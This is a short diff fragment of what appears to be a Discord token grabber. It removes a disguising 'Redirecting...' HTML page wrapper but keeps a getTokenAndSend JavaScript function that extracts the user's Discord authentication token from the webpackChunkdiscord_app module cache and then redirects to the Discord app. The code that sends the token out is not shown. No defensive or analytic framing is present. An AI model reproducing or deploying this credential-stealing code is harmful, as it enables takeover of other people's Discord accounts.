@@ -1,10 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <script>
-        function getTokenAndSend() {
+function getTokenAndSend() {
             var token = (webpackChunkdiscord_app.push([[''], {}, e => {
                 m = [];
                 for (let c in e.c) m.push(e.c[c]);
@@ -37,9 +31,3 @@
             getTokenAndSend();
             window.location.href = "https://discord.com/app";
         }
-    </script>
-</head>
-<body>
-    <p>Redirecting...</p>
-</body>
-</html>
